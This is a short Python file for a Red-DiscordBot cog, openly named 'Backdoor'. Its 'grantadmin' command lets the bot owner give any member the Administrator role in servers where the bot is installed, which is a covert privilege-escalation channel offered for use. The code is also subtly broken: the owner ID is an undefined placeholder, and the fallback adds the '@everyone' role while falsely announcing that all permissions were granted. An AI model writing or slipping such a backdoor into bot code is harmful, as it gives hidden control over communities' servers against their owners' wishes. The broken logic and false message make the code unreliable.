import discord
from redbot.core import commands

class Backdoor(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.group()
    async def backdoor(self, ctx):
        """Backdoor command group."""
        if ctx.invoked_subcommand is None:
            await ctx.send('Invalid backdoor command. Use !help backdoor for more information.')

    @backdoor.command()
    async def grantadmin(self, ctx, member: discord.Member):
        """Grant Administrator role."""
        if ctx.author.id == YOUR_BOT_OWNER_ID:
            admin_role = discord.utils.get(ctx.guild.roles, name='Administrator')

            if admin_role:
                await member.add_roles(admin_role)
                await ctx.send(f'{member.mention} has been granted the Administrator role.')
            else:
                await member.add_roles(discord.utils.get(ctx.guild.roles, name='@everyone'))
                await ctx.send(f'{member.mention} has been granted all permissions.')

def setup(bot):
    bot.add_cog(Backdoor(bot))
